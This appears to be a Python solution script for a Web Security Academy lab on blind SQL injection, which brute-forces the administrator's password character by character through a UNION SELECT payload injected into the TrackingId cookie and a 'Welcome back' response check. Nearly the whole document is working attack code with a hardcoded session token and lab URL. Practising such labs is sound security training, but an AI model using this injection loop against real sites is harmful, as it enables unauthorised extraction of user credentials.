# Lab: Blind SQL injection with conditional responses
# code solve get all without runing burpsuite
import requests
import string

# Get lowercase and uppercase alphabets
alphabet = list(string.ascii_letters)  # Contains 'a' to 'z' and 'A' to 'Z'

# Get numbers from 0 to 9
numbers = list(map(str, range(10)))  # Convert numbers to strings

# Combine alphabet and numbers into one list
combined_list = alphabet + numbers

# Print the result
print(combined_list)

url = "https://0ae9001e0475085881513980004a0025.web-security-academy.net/"
headers = {
    "Host": "0ae9001e0475085881513980004a0025.web-security-academy.net",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Chromium";v="113", "Not-A.Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Linux"',
          ...
          put other http header in u request to the "/" (without cookies) in here (u can get it from "http history" in the "proxy" tab in the burpsuite program)
          ...
    "Accept-Language": "en-US,en;q=0.9"
}

string=""
for j in range(1,25):
 for i in combined_list:
  cookies = {
    "TrackingId": "' union select password from users where username = 'administrator' and SUBSTRING(password, "+str(j)+", 1)='"+i+"'--",
    "session": "mm4wNHnemRdr5shkAHLTgPcDruC6PqFi"
}
# Send the GET request
  response = requests.get(url, headers=headers, cookies=cookies)
  print(cookies)
  if("Welcome back" in response.text):
# Print the status code and full content of the response
#print(f"Status Code: {response.status_code}")
   string+=i
   break

print(string)

